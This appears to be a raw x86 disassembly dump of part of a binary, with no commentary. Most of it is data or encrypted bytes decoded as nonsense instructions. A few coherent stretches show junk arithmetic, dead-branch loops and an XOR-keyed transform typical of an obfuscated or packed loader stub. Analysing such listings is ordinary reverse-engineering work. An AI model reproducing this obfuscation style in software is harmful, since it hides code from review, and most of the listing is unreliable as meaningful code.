  403150:	add    DWORD PTR [ebx+0x3f],ebx
  403153:	lods   eax,DWORD PTR ds:[esi]
  403154:	loopne 0x40314a
  403156:	jno    0xcd9d39b3
  40315c:	std    
  40315d:	mov    cl,0x48
  40315f:	cdq    
  403160:	mov    ebx,0xf0e82e11
  403165:	rcr    BYTE PTR [ebx-0x32],1
  403168:	mov    eax,0x3754c839
  40316d:	or     al,0xab
  40316f:	xchg   ebp,eax
  403170:	dec    esp
  403171:	ftst   
  403173:	mov    ebp,0x67b6f67c
  403178:	(bad)  
  403179:	mov    ds:0x3183ba94,al
  40317e:	sub    ch,ah
  403180:	adc    al,0x28
  403182:	xlat   BYTE PTR ds:[ebx]
  403183:	xor    BYTE PTR [esi-0x61],bl
  403186:	inc    esi
  403187:	mov    ch,dh
  403189:	mov    dl,0x94
  40318b:	pop    ss
  40318c:	lds    edi,FWORD PTR [esi+ebp*8-0x57]
  403190:	mov    eax,0xf740fa7f
  403195:	jge    0x4031c0
  403197:	fisttp WORD PTR [ebx+0x222df74f]
  40319d:	adc    eax,0x24e9b7c0
  4031a2:	cmp    DWORD PTR [esi+edx*4-0x6c156298],edx
  4031a9:	retf   0x954c
  4031ac:	nop
  4031ad:	pushf  
  4031ae:	xchg   ebx,eax
  4031af:	push   esp
  4031b0:	push   ebx
  4031b1:	mov    ebp,0xf69a7245
  4031b6:	push   0x5b
  4031b8:	xchg   ecx,eax
  4031b9:	pop    esp
  4031ba:	shr    ch,0x96
  4031bd:	shl    esp,cl
  4031bf:	es in  al,0xcf
  4031c2:	add    ecx,esp
  4031c4:	jl     0x40319f
  4031c6:	std    
  4031c7:	adc    DWORD PTR [eax-0x7150401b],ebx
  4031cd:	sub    al,0xe2
  4031cf:	mov    esi,0xb54f8aaa
  4031d4:	in     eax,dx
  4031d5:	mov    esp,eax
  4031d7:	outs   dx,DWORD PTR ds:[esi]
  4031d8:	es call 0xddb06dab
  4031de:	not    DWORD PTR [edi-0x3f]
  4031e1:	retf   
  4031e2:	sar    DWORD PTR [edi+0x67],cl
  4031e5:	mov    ecx,0x5f25a035
  4031ea:	ins    DWORD PTR es:[edi],dx
  4031eb:	ror    cl,1
  4031ed:	pushf  
  4031ee:	aad    0x7a
  4031f0:	mov    cl,bh
  4031f2:	aad    0xdb
  4031f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031f5:	loope  0x4031d0
  4031f7:	jo     0x40317b
  4031f9:	test   al,0xb8
  4031fb:	lahf   
  4031fc:	arpl   WORD PTR [ecx+0x56421040],bp
  403202:	js     0x4031cb
  403204:	je     0x403241
  403206:	or     esi,DWORD PTR [esi+0x5b]
  403209:	dec    edx
  40320a:	or     dh,BYTE PTR [edi+0x5acd9283]
  403210:	fwait
  403211:	aaa    
  403212:	mov    ebp,esi
  403214:	sub    eax,0x69236a89
  403219:	push   ecx
  40321a:	xchg   ecx,eax
  40321b:	adc    BYTE PTR [ecx-0x5656b401],bh
  403221:	fldcw  WORD PTR [ebp+0x33cf9909]
  403227:	inc    ecx
  403228:	out    dx,al
  403229:	ficomp DWORD PTR [esi+0x56e32454]
  40322f:	cmc    
  403230:	mov    ebx,ebp
  403232:	xor    BYTE PTR [eax+0x6c],bh
  403235:	sbb    ah,BYTE PTR [ecx]
  403237:	inc    ecx
  403238:	fsub   DWORD PTR [ebx]
  40323a:	mov    ds:0xc9fd1415,al
  40323f:	adc    eax,0xc2f52928
  403244:	adc    eax,0x52fc50e0
  403249:	lea    ebp,[ecx+eiz*2-0x3e]
  40324d:	and    BYTE PTR ds:0xd2295e2b,cl
  403253:	and    esp,DWORD PTR [edx]
  403255:	pop    ecx
  403256:	and    BYTE PTR [edi],ah
  403258:	leave  
  403259:	rol    DWORD PTR [edx+0x36fa61e1],cl
  40325f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403260:	dec    edx
  403261:	jmp    0x3e2d:0x99d7c981
  403268:	lea    ebx,[edx+0x37]
  40326b:	push   ss
  40326c:	popf   
  40326d:	push   edx
  40326e:	mov    dl,0x86
  403270:	mov    eax,ds:0x84cfed61
  403275:	dec    eax
  403276:	mov    eax,0x8a38
  40327b:	xor    ax,WORD PTR [ecx+0x20]
  40327f:	mov    ecx,0x3afe
  403284:	and    DWORD PTR ds:0x4345fb,0x4345c3
  40328e:	add    ax,cx
  403291:	mov    ecx,DWORD PTR ds:0x43460f
  403297:	xor    ecx,DWORD PTR ds:0x43456b
  40329d:	mov    DWORD PTR ds:0x43460f,ecx
  4032a3:	movzx  eax,ax
  4032a6:	mov    ecx,DWORD PTR ds:0x4345ff
  4032ac:	xor    DWORD PTR ds:0x434583,ecx
  4032b2:	mov    DWORD PTR [ebp-0xc],eax
  4032b5:	mov    ecx,DWORD PTR ds:0x43460f
  4032bb:	sbb    ecx,DWORD PTR ds:0x43463f
  4032c1:	mov    DWORD PTR ds:0x43460f,ecx
  4032c7:	mov    BYTE PTR [ebp-0x1],0x7f
  4032cb:	lea    eax,[ebp-0x1]
  4032ce:	or     DWORD PTR ds:0x43460f,0x2e6e
  4032d8:	mov    DWORD PTR [ebp-0x10],eax
  4032db:	and    DWORD PTR ds:0x43468b,edi
  4032e1:	jmp    0x4036d6
  4032e6:	jo     0x4032d7
  4032e8:	inc    edi
  4032e9:	xchg   DWORD PTR [ecx-0x49],eax
  4032ec:	jo     0x4032d7
  4032ee:	jne    0x403366
  4032f0:	xchg   edx,eax
  4032f1:	or     ch,BYTE PTR [eax+0xb6e6f15]
  4032f7:	adc    BYTE PTR [esi+0x7e],bh
  4032fa:	push   esi
  4032fb:	jns    0x40337b
  4032fd:	jle    0x403295
  4032ff:	xchg   cl,cl
  403301:	rcl    DWORD PTR [edx+0x33cdcf3a],1
  403307:	cs jle 0x4032b3
  40330a:	xor    al,0x7c
  40330c:	jbe    0x403299
  40330e:	shl    DWORD PTR ds:0xacf0fbac,0xb2
  403315:	mov    al,ds:0x1a966dc
  40331a:	outs   dx,DWORD PTR ds:[esi]
  40331b:	jl     0x40330c
  40331d:	pop    esi
  40331e:	mov    bl,0x37
  403320:	jns    0x403388
  403322:	mov    ecx,0xc6abdfc8
  403327:	aad    0x66
  403329:	test   DWORD PTR [eax-0x50339835],ecx
  40332f:	gs je  0x4032cd
  403332:	dec    eax
  403333:	and    eax,0x49f72cde
  403338:	loope  0x403327
  40333a:	mov    bl,0x4
  40333c:	adc    bl,BYTE PTR [ecx+0x732831ef]
  403342:	fwait
  403343:	div    DWORD PTR ds:0xbb01d1ee
  403349:	clc    
  40334a:	fwait
  40334b:	xchg   esi,eax
  40334c:	mov    dl,0x1a
  40334e:	dec    edx
  40334f:	push   ebp
  403350:	add    al,0x63
  403352:	sub    BYTE PTR [esi+0x1c],ah
  403355:	sbb    DWORD PTR [esp+ecx*1-0x7c739b2a],edx
  40335c:	out    dx,eax
  40335d:	in     al,0x9f
  40335f:	fcom   DWORD PTR [eax-0x1e]
  403362:	mov    dl,0x95
  403364:	shl    DWORD PTR [ebp-0x15],1
  403367:	fcom   QWORD PTR [edx]
  403369:	out    0x2c,eax
  40336b:	and    edx,DWORD PTR [edx]
  40336d:	add    eax,0xc7dafe70
  403372:	pop    es
  403373:	aam    0x31
  403375:	mov    ds:0x1e706d31,eax
  40337a:	mov    es,WORD PTR [ebx-0x1d6e21db]
  403380:	iret   
  403381:	(bad)  
  403382:	cmp    eax,0x761daf81
  403387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403388:	jbe    0x4033b4
  40338a:	std    
  40338b:	rcr    BYTE PTR [ecx-0x2d],cl
  40338e:	loopne 0x4033e2
  403390:	cmc    
  403391:	sbb    dl,dh
  403393:	adc    ebp,DWORD PTR [edx+edi*8-0x66]
  403397:	lea    eax,[ebx+0x2f1d17c5]
  40339d:	out    dx,al
  40339e:	and    eax,0x2dd72cb1
  4033a3:	mov    ah,0x8a
  4033a5:	sar    BYTE PTR [ecx],1
  4033a7:	push   ebp
  4033a8:	call   0x47f27f54
  4033ad:	cmc    
  4033ae:	or     DWORD PTR [edi-0x4d],esi
  4033b1:	jle    0x403400
  4033b3:	pop    esi
  4033b4:	jecxz  0x40335d
  4033b6:	scas   al,BYTE PTR es:[edi]
  4033b7:	ret    
  4033b8:	stos   BYTE PTR es:[edi],al
  4033b9:	test   BYTE PTR [edi],bh
  4033bb:	xor    DWORD PTR [eax],ecx
  4033bd:	mov    ah,0x44
  4033bf:	xor    edx,DWORD PTR [ebx-0x71]
  4033c2:	int    0x65
  4033c4:	add    DWORD PTR [eax-0x22c2b853],ebx
  4033ca:	mov    dh,0x3
  4033cc:	pop    es
  4033cd:	adc    al,0x3c
  4033cf:	xor    ah,BYTE PTR [eax]
  4033d1:	dec    ebp
  4033d2:	and    al,0xd1
  4033d4:	bnd fs jp 0x403441
  4033d8:	inc    edx
  4033d9:	inc    esp
  4033da:	sub    BYTE PTR [edx+ebx*4+0x3ea9a221],bh
  4033e1:	push   cs
  4033e2:	mov    ebp,0x7385d8f4
  4033e7:	mov    edx,0x3c25093f
  4033ec:	je     0x403462
  4033ee:	xchg   DWORD PTR [esi-0x24d51c47],ecx
  4033f4:	push   edx
  4033f5:	jl     0x4033dd
  4033f7:	push   ebx
  4033f8:	mov    ds:0x3b2b0334,al
  4033fd:	mov    edi,0xb48973bf
  403402:	pop    ebp
  403403:	xchg   ebx,eax
  403404:	ror    DWORD PTR [ebp+0x6f],cl
  403407:	adc    ebp,DWORD PTR [ebx+0x52]
  40340a:	jmp    0x4033d8
  40340c:	jmp    FWORD PTR [esi+0x30c444e0]
  403412:	jne    0x403411
  403414:	xchg   esi,eax
  403415:	add    al,0x3b
  403417:	test   BYTE PTR [ecx],ch
  403419:	inc    ebx
  40341a:	pop    ss
  40341b:	jbe    0x4033a2
  40341d:	mov    cl,0x98
  40341f:	fdiv   DWORD PTR [edx-0x39]
  403422:	xchg   ebp,eax
  403423:	or     BYTE PTR [ebp-0x59],bh
  403426:	daa    
  403427:	out    dx,al
  403428:	sbb    bh,al
  40342a:	(bad)  
  40342b:	gs test al,0xf8
  40342e:	inc    ebp
  40342f:	mov    DWORD PTR ds:0xe6af1857,esp
  403435:	sti    
  403436:	jo     0x40346c
  403438:	adc    dh,BYTE PTR [esi]
  40343a:	adc    DWORD PTR ss:[ebx],eax
  40343d:	jle    0x403402
  40343f:	cmp    DWORD PTR [ebx-0x347a5252],ebp
  403445:	mov    dx,0xada8
  403449:	das    
  40344a:	add    eax,0x8614dd74
  40344f:	shl    WORD PTR [ecx-0x52],cl
  403453:	mov    ebx,0x8283d7f5
  403458:	add    eax,0xccf3ed43
  40345d:	mov    ebp,0x3ed004c7
  403462:	push   0x7d
  403464:	fidiv  WORD PTR [ecx+0x779dd86a]
  40346a:	test   DWORD PTR [eax+0xd],esp
  40346d:	mov    ecx,0x24d12e72
  403472:	(bad)  
  403473:	sub    BYTE PTR [esi+0x7b],al
  403476:	mov    dl,0xfb
  403478:	xor    ah,BYTE PTR ds:0x6af5a42f
  40347e:	pavgb  mm3,QWORD PTR [eax+eax*8+0x4e]
  403483:	dec    edx
  403484:	test   al,0x21
  403486:	enter  0xa122,0x0
  40348a:	sub    edi,esp
  40348c:	adc    al,0x1b
  40348e:	scas   eax,DWORD PTR es:[edi]
  40348f:	adc    al,0x72
  403491:	hlt    
  403492:	pop    edx
  403493:	mov    al,ds:0x18e41161
  403498:	jg     0x403429
  40349a:	lea    eax,[ecx+0x72]
  40349d:	sub    DWORD PTR [ecx],eax
  40349f:	dec    esp
  4034a0:	add    esi,esi
  4034a2:	imul   edi,DWORD PTR [esi-0x23],0xc0452223
  4034a9:	jb     0x40345a
  4034ab:	sub    esi,DWORD PTR [edx+0x49]
  4034ae:	arpl   WORD PTR [edi+0xb],cx
  4034b1:	pop    edi
  4034b2:	(bad)  
  4034b3:	aad    0x44
  4034b5:	push   edi
  4034b6:	mov    esp,0x68b1e4a1
  4034bb:	jb     0x4034fc
  4034bd:	nop
  4034be:	mov    edx,0x8d394447
  4034c3:	mov    DWORD PTR [ecx],ebx
  4034c5:	inc    eax
  4034c6:	push   edx
  4034c7:	pop    ebx
  4034c8:	aad    0x50
  4034ca:	jne    0x4034c2
  4034cc:	pop    eax
  4034cd:	cwde   
  4034ce:	xchg   edi,eax
  4034cf:	out    0xfb,al
  4034d1:	push   0x151d640e
  4034d6:	and    eax,0x66f81587
  4034db:	shl    DWORD PTR [eax],0xf3
  4034de:	fbld   TBYTE PTR [ebx]
  4034e0:	mov    dl,BYTE PTR [esi-0x2317500a]
  4034e6:	and    BYTE PTR [ebx+0x5b],dh
  4034e9:	(bad)  
  4034ea:	sbb    edi,DWORD PTR [eax]
  4034ec:	test   edi,eax
  4034ee:	dec    eax
  4034ef:	jb     0x4034de
  4034f1:	pop    ss
  4034f2:	pushf  
  4034f3:	bound  ebx,QWORD PTR [edi+edi*1-0x547c2854]
  4034fa:	or     DWORD PTR [ebp+0x7c59eb2c],edx
  403500:	cmp    ebp,DWORD PTR [ebp+0x25]
  403503:	push   ebx
  403504:	and    DWORD PTR [edi+0x794ccd8],0x34188aa7
  40350e:	xor    DWORD PTR [edi],0x811f0427
  403514:	sub    esp,DWORD PTR [ebx]
  403516:	adc    al,BYTE PTR [ecx+0x19]
  403519:	lds    ebp,FWORD PTR [edx-0xc]
  40351c:	or     DWORD PTR [eax-0x2acee7c0],ecx
  403522:	lahf   
  403523:	test   eax,0xcac66c25
  403528:	retf   
  403529:	sbb    DWORD PTR [edx-0xf],edx
  40352c:	mov    gs,WORD PTR [ecx-0x5d]
  40352f:	add    al,0xd8
  403531:	mov    BYTE PTR [eax],ah
  403533:	sub    al,0xc3
  403535:	ins    DWORD PTR es:[edi],dx
  403536:	inc    edx
  403537:	xchg   ebx,eax
  403538:	mov    esp,0x68b5df60
  40353d:	xchg   ebx,eax
  40353e:	loopne 0x403556
  403540:	jo     0x403589
  403542:	arpl   WORD PTR [edx-0x1eb86a63],bx
  403548:	loopne 0x403518
  40354a:	sub    al,0x13
  40354c:	das    
  40354d:	adc    ch,BYTE PTR [edi-0x77137150]
  403553:	pop    ecx
  403554:	inc    eax
  403555:	outs   dx,DWORD PTR ds:[esi]
  403556:	into   
  403557:	bound  ecx,QWORD PTR [edx+eiz*8+0x65]
  40355b:	ins    BYTE PTR es:[edi],dx
  40355c:	rol    BYTE PTR [edi],cl
  40355e:	out    dx,eax
  40355f:	lahf   
  403560:	pop    esp
  403561:	stc    
  403562:	(bad)  
  403563:	fadd   QWORD PTR [ecx]
  403565:	and    al,0xc9
  403567:	rcl    BYTE PTR [edi],cl
  403569:	pop    ebx
  40356a:	mov    ebx,0x80ecd2e8
  40356f:	mov    edx,0xa92665d1
  403574:	in     eax,dx
  403575:	aas    
  403576:	dec    eax
  403577:	push   eax
  403578:	sub    esi,0x99d3a8fc
  40357e:	sub    bh,BYTE PTR [ebx-0x65]
  403581:	xor    edi,ecx
  403583:	daa    
  403584:	and    dh,BYTE PTR [ebp+0x306b33f8]
  40358a:	ss mov cl,0xad
  40358d:	fiadd  DWORD PTR [eax+ebx*1+0x26]
  403591:	retf   0xcb42
  403594:	loope  0x403612
  403596:	mov    eax,ds:0x624143e8
  40359b:	xchg   DWORD PTR [eax-0x764b05e9],esp
  4035a1:	pop    es
  4035a2:	mov    WORD PTR [esi-0x36215f7c],?
  4035a8:	cmp    bl,BYTE PTR [edi]
  4035aa:	leave  
  4035ab:	adc    dh,BYTE PTR [eax*8+0x35e20200]
  4035b2:	mov    esi,0xcf244864
  4035b7:	fisttp WORD PTR [esi+0x49]
  4035ba:	pop    ds
  4035bb:	mov    bh,0x96
  4035bd:	jb     0x403624
  4035bf:	js     0x403601
  4035c1:	in     al,dx
  4035c2:	aad    0x65
  4035c4:	mov    ecx,0x53f74eba
  4035c9:	loop   0x4035bb
  4035cb:	or     ecx,DWORD PTR [edx]
  4035cd:	push   ebx
  4035ce:	xor    BYTE PTR [eax+0x1e],al
  4035d1:	mov    esi,0xaad4e680
  4035d6:	and    ebx,DWORD PTR [ebp-0x2e]
  4035d9:	sbb    al,0x66
  4035db:	popf   
  4035dc:	stos   DWORD PTR es:[edi],eax
  4035dd:	cmp    dl,ch
  4035df:	repz pop edx
  4035e1:	(bad)  
  4035e2:	mov    gs,WORD PTR [esp+esi*1]
  4035e5:	or     esp,DWORD PTR [esp+esi*1]
  4035e8:	inc    edx
  4035e9:	cs inc eax
  4035eb:	test   al,0x3b
  4035ed:	push   ds
  4035ee:	or     al,BYTE PTR [edx]
  4035f0:	dec    ecx
  4035f1:	push   edx
  4035f2:	aad    0x57
  4035f4:	(bad)  
  4035f6:	mov    dl,0xd4
  4035f8:	test   BYTE PTR [edx-0x57ec99b3],ah
  4035fe:	xor    BYTE PTR [ecx],dh
  403600:	cwde   
  403601:	mov    bl,0x6a
  403603:	js     0x4035fb
  403605:	ins    BYTE PTR es:[edi],dx
  403606:	add    eax,0x37b84101
  40360b:	sbb    DWORD PTR [eax+0x36],ebx
  40360e:	sahf   
  40360f:	mov    ebp,0xf16c238b
  403614:	ret    
  403615:	mov    ds:0xf732c87a,eax
  40361a:	xor    DWORD PTR [ebx+ebx*4],edi
  40361d:	mov    esi,0x62409f63
  403622:	hlt    
  403623:	sbb    DWORD PTR [ecx-0x1b],esp
  403626:	xor    eax,0x1acad79b
  40362b:	xor    bl,bl
  40362d:	ins    BYTE PTR es:[edi],dx
  40362e:	jmp    0xe8e:0xae45a83f
  403635:	xor    al,BYTE PTR [ecx+0x2b]
  403638:	mov    eax,ds:0x196fb53d
  40363d:	ja     0x4035f8
  40363f:	dec    edx
  403640:	and    al,0x33
  403642:	mov    dh,BYTE PTR [ebx+0xfa61748]
  403648:	shr    BYTE PTR [edi-0xfa86094],1
  40364e:	dec    eax
  40364f:	loopne 0x40361d
  403651:	ss inc ecx
  403653:	loope  0x4035e2
  403655:	push   es
  403656:	mov    ecx,0x5fc930ed
  40365b:	push   esp
  40365c:	dec    edi
  40365d:	jbe    0x4035e9
  40365f:	addr16 aas 
  403661:	shl    BYTE PTR [ebx+0x3d],cl
  403664:	lds    eax,FWORD PTR [ebx]
  403666:	int    0x1b
  403668:	jp     0x4036e1
  40366a:	dec    DWORD PTR [esi]
  40366c:	retf   
  40366d:	sub    eax,0x640ea6f9
  403672:	icebp  
  403673:	enter  0x4abf,0x6d
  403677:	in     eax,dx
  403678:	rcl    BYTE PTR [ebx],cl
  40367a:	retf   0x3e11
  40367d:	or     eax,0xbf0b3d09
  403682:	imul   DWORD PTR [esp+ecx*8-0x11de698d]
  403689:	or     al,0x64
  40368b:	mov    edi,0x45ab7928
  403690:	add    eax,0xff355fbf
  403695:	mov    esi,DWORD PTR [edx-0x63ca60b6]
  40369b:	das    
  40369c:	inc    esp
  40369d:	pop    eax
  40369e:	inc    esp
  40369f:	xchg   edi,eax
  4036a0:	dec    esi
  4036a1:	dec    edi
  4036a2:	jno    0x403716
  4036a4:	cld    
  4036a5:	ja     0x403714
  4036a7:	cs xchg esi,eax
  4036a9:	dec    edx
  4036aa:	pusha  
  4036ab:	mov    DWORD PTR [esi-0x72],esp
  4036ae:	fld    TBYTE PTR [esi-0x54b393a4]
  4036b4:	sub    BYTE PTR [ebp+0x69],0x9
  4036b8:	clc    
  4036b9:	es push ebp
  4036bb:	mov    fs,WORD PTR [eax-0x7f]
  4036be:	addr16 fwait
  4036c0:	popa   
  4036c1:	arpl   WORD PTR [ecx+eiz*2-0x71],di
  4036c5:	stc    
  4036c6:	cmp    BYTE PTR [esp+eiz*4+0x21edc28],bl
  4036cd:	jmp    0xe84b:0x1c389bf0
  4036d4:	out    dx,eax
  4036d5:	cmp    DWORD PTR [edx+0xd8bff45],ecx
  4036db:	imul   eax,DWORD PTR [ebp+0x43],0x0
  4036df:	sbb    ecx,DWORD PTR ds:0x434687
  4036e5:	mov    DWORD PTR ds:0x43456b,ecx
  4036eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4036ee:	sbb    DWORD PTR ds:0x434693,0x563b
  4036f8:	xor    al,0x44
  4036fa:	add    DWORD PTR ds:0x43457b,0xe00
  403704:	sub    al,0x3a
  403706:	or     DWORD PTR ds:0x434577,0x434687
  403710:	mov    BYTE PTR [ecx],al
  403712:	xor    DWORD PTR ds:0x4345f7,ecx
  403718:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  40371f:	and    DWORD PTR ds:0x434607,0x0
  403729:	jmp    0x40373d
  40372e:	xor    ecx,ecx
  403730:	xor    ecx,DWORD PTR ds:0x434607
  403736:	inc    ecx
  403737:	mov    DWORD PTR ds:0x434607,ecx
  40373d:	cmp    DWORD PTR ds:0x434607,0x18
  403744:	jae    0x40382f
  40374a:	cmp    DWORD PTR ds:0x434607,0x20
  403751:	jne    0x40376a
  403757:	push   0x446b
  40375c:	push   DWORD PTR [ebp-0xc]
  40375f:	push   0x8d79
  403764:	call   DWORD PTR ds:0x413278
  40376a:	jmp    0x40372e
  40376f:	mov    DWORD PTR ds:0x43464b,0x14
  403779:	cmp    DWORD PTR ds:0x43464b,0x0
  403780:	je     0x40382f
  403786:	cmp    DWORD PTR ds:0x43464b,0xa
  40378d:	jne    0x4037a6
  403793:	push   0x695b
  403798:	push   0x23be
  40379d:	push   DWORD PTR [ebp-0x18]
  4037a0:	call   DWORD PTR ds:0x41327c
  4037a6:	cmp    DWORD PTR ds:0x43464b,0xb
  4037ad:	jne    0x4037c0
  4037b3:	mov    ecx,DWORD PTR ds:0x43464b
  4037b9:	dec    ecx
  4037ba:	mov    DWORD PTR ds:0x43464b,ecx
  4037c0:	mov    ecx,DWORD PTR ds:0x43464b
  4037c6:	dec    ecx
  4037c7:	mov    DWORD PTR ds:0x43464b,ecx
  4037cd:	jmp    0x403779
  4037d2:	mov    DWORD PTR ds:0x434567,0x1c
  4037dc:	cmp    DWORD PTR ds:0x434567,0x0
  4037e3:	je     0x40382f
  4037e9:	cmp    DWORD PTR ds:0x434567,0xc
  4037f0:	jne    0x403801
  4037f6:	push   0x4347c9
  4037fb:	call   DWORD PTR ds:0x413334
  403801:	cmp    DWORD PTR ds:0x434567,0xd
  403808:	jne    0x40381b
  40380e:	mov    ecx,DWORD PTR ds:0x434567
  403814:	dec    ecx
  403815:	mov    DWORD PTR ds:0x434567,ecx
  40381b:	mov    ecx,DWORD PTR ds:0x434567
  403821:	dec    ecx
  403822:	mov    DWORD PTR ds:0x434567,ecx
  403828:	jmp    0x4037dc
  40382d:	xor    ecx,ecx
  40382f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  403836:	adc    eax,eax
  403838:	mov    eax,DWORD PTR [ebp-0x8]
  40383b:	mov    ecx,0x7510851
  403840:	push   esi
  403841:	adc    DWORD PTR ds:0x434607,edi
  403847:	xor    eax,ecx
  403849:	inc    DWORD PTR ds:0x43468b
  40384f:	mov    esi,0x327299
  403854:	sub    DWORD PTR ds:0x4345cf,0x3953
  40385e:	add    eax,esi
  403860:	jmp    0x40387d
  403865:	not    DWORD PTR ds:0x4345c3
  40386b:	mov    dl,BYTE PTR [ebp-0x1]
  40386e:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403872:	mov    DWORD PTR ds:0x4345cb,0x4a72
  40387c:	inc    eax
  40387d:	cmp    eax,0x40
  403880:	jb     0x403865
  403886:	mov    edx,DWORD PTR [ebp-0x8]
  403889:	mov    eax,DWORD PTR [ebp-0xc]
  40388c:	xor    edx,ecx
  40388e:	add    edx,esi
  403890:	cmp    edx,eax
  403892:	je     0x403ccd
  403898:	push   ebx
  403899:	push   edi
  40389a:	mov    edi,DWORD PTR [ebp+0x8]
  40389d:	mov    eax,0x8a38
  4038a2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4038a7:	mov    edi,0x3afe
  4038ac:	jmp    0x403ca1
  4038b1:	sbb    DWORD PTR [edx+0x31],0x6d5dfd54
  4038b8:	jae    0x4038d9
  4038ba:	(bad)  
  4038bb:	out    dx,al
  4038bc:	xchg   esi,eax
  4038bd:	xchg   ebp,eax
  4038be:	push   ebp
  4038bf:	lahf   
  4038c0:	mov    esp,DWORD PTR [ebx+0x13]
  4038c3:	jle    0x403943
  4038c5:	push   esi
  4038c6:	jns    0x403946
  4038c8:	jle    0x40392e
  4038ca:	lds    esi,FWORD PTR [ecx]
  4038cc:	jo     0x403904
  4038ce:	in     al,dx
  4038cf:	arpl   sp,cx
  4038d1:	jl     0x403881
  4038d3:	neg    DWORD PTR [ebx]
  4038d5:	fsubr  DWORD PTR [edx-0x23b1b465]
  4038db:	xor    DWORD PTR [ecx],ebp
  4038dd:	pop    es
  4038de:	stc    
  4038df:	scas   eax,DWORD PTR es:[edi]
  4038e0:	mov    bh,0xc7
  4038e2:	push   edx
  4038e3:	push   edx
  4038e4:	rol    DWORD PTR [ebp+0x2a],cl
  4038e7:	mov    DWORD PTR [esi+0x2f7a39d],ebp
  4038ed:	sub    eax,0x21d6e2b3
  4038f2:	push   ss
  4038f3:	ror    DWORD PTR [ecx+eax*4-0x7a4b12c4],1
  4038fa:	inc    ecx
  4038fb:	and    BYTE PTR [ebx-0x3dfed4ee],0x3a
  403902:	mov    ebx,0xcc618189
  403907:	and    esi,DWORD PTR [ebx]
  403909:	adc    eax,DWORD PTR [edi+ebx*8-0x1b7b811]
  403910:	sbb    al,0xf9
  403912:	push   edx
  403913:	cmp    eax,0xe2f1a4c4
  403918:	sub    edx,edi
  40391a:	mov    bh,0xa3
  40391c:	mov    bl,BYTE PTR ds:[bp+di+0x13]
  403921:	dec    edx
  403922:	icebp  
  403923:	mov    edi,0x2d032aac
  403928:	std    
  403929:	xchg   BYTE PTR ds:0x31d6637e,dh
  40392f:	(bad)  
  403930:	(bad)  
  403931:	mov    ah,0x8b
  403933:	test   eax,0x4c3ad5f7
  403938:	inc    eax
  403939:	pop    ecx
  40393a:	fwait
  40393b:	mov    eax,ds:0x9152edae
  403940:	sub    al,0xed
  403942:	pop    edi
  403943:	adc    DWORD PTR [ebp+0x27],ebx
  403946:	fdivr  DWORD PTR [eax]
  403948:	test   eax,0x544368af
  40394d:	and    ebp,ebp
  40394f:	lods   al,BYTE PTR ds:[esi]
  403950:	pop    edi
  403951:	sti    
  403952:	and    eax,0xc4b9ecc4
  403957:	pop    edx
  403958:	call   0x22cc2bb9
  40395d:	jmp    0x40397f
  40395f:	push   edi
  403960:	rcl    DWORD PTR ds:0x6e9da0fd,1
  403966:	sbb    bh,BYTE PTR [esi-0x55]
  403969:	cld    
  40396a:	jbe    0x40390d
  40396c:	out    0x29,eax
  40396e:	cmp    edi,ebx
  403970:	repnz mov eax,ds:0x50ab7915
  403976:	sar    cl,1
  403978:	add    BYTE PTR [eax-0x6f],ch
  40397b:	jne    0x403995
  40397d:	cmp    BYTE PTR [ecx],dh
  40397f:	shr    DWORD PTR [edx],0xf2
  403982:	jns    0x4039e9
  403984:	push   ss
  403985:	ror    DWORD PTR [eax+0x5a],cl
  403988:	mov    bl,0x22
  40398a:	(bad)  
  40398b:	sbb    eax,0xd36a6b7d
  403990:	out    dx,al
  403991:	sbb    DWORD PTR [esi],edi
  403993:	dec    DWORD PTR [ecx]
  403995:	imul   eax,DWORD PTR [esi-0x60f8d4c],0x31b80bc6
  40399f:	scas   al,BYTE PTR es:[edi]
  4039a0:	mul    BYTE PTR [esi]
  4039a2:	sti    
  4039a3:	enter  0x5100,0x99
  4039a7:	call   0x5162:0xaa859787
  4039ae:	jo     0x4039d9
  4039b0:	or     BYTE PTR [eax+0x157a5ddb],bh
  4039b6:	or     al,0x29
  4039b8:	arpl   WORD PTR [edi],ax
  4039ba:	aas    
  4039bb:	ins    DWORD PTR es:[edi],dx
  4039bc:	xor    DWORD PTR [ebx],eax
  4039be:	jmp    0x403a04
  4039c0:	lods   al,BYTE PTR ds:[esi]
  4039c1:	shl    DWORD PTR [ecx-0x38],1
  4039c4:	mov    dh,0x86
  4039c6:	xchg   esp,eax
  4039c7:	dec    edi
  4039c8:	or     DWORD PTR [edi+0x14],ecx
  4039cb:	sub    BYTE PTR [ebp+0x54f2f6af],al
  4039d1:	cmp    BYTE PTR [ecx+0x7b1bdf53],al
  4039d7:	les    ebp,FWORD PTR [edi+0x47]
  4039da:	cwde   
  4039db:	(bad)  
  4039dc:	ds pushf 
  4039de:	sbb    DWORD PTR ds:0x560f130a,ebx
  4039e4:	sub    ebx,DWORD PTR [edi]
  4039e6:	pop    ss
  4039e7:	daa    
  4039e8:	mov    ds:0xa856633e,eax
  4039ed:	(bad)  
  4039ee:	idiv   BYTE PTR [edx+eiz*8-0x30]
  4039f2:	and    BYTE PTR [ecx],bh
  4039f4:	mov    eax,ds:0xee816ead
  4039f9:	mov    BYTE PTR [ebx-0x5e],dl
  4039fc:	ret    0x6609
  4039ff:	mov    ds:0x7260255d,eax
  403a04:	sahf   
  403a05:	(bad)  
  403a06:	stos   DWORD PTR es:[edi],eax
  403a07:	xlat   BYTE PTR ds:[ebx]
  403a08:	es sbb eax,0xf33036f2
  403a0e:	inc    esp
  403a0f:	clc    
  403a10:	xor    BYTE PTR [ecx+0x5f],dl
  403a13:	fistp  WORD PTR [eax-0x6b03e34e]
  403a19:	mov    al,0x5f
  403a1b:	sbb    ah,al
  403a1d:	das    
  403a1e:	inc    edi
  403a1f:	sub    al,0xd5
  403a21:	test   BYTE PTR [ebx],bh
  403a23:	sub    al,0x62
  403a25:	test   BYTE PTR es:[ebp+0x3ea57299],bh
  403a2c:	dec    ebp
  403a2d:	pop    edx
  403a2e:	test   BYTE PTR [esi],0xa
  403a31:	pusha  
  403a32:	xchg   edi,eax
  403a33:	test   ebp,0x307d0382
  403a39:	mov    eax,0x43d0ca7e
  403a3e:	adc    BYTE PTR [edx],bh
  403a40:	cld    
  403a41:	lods   al,BYTE PTR ds:[esi]
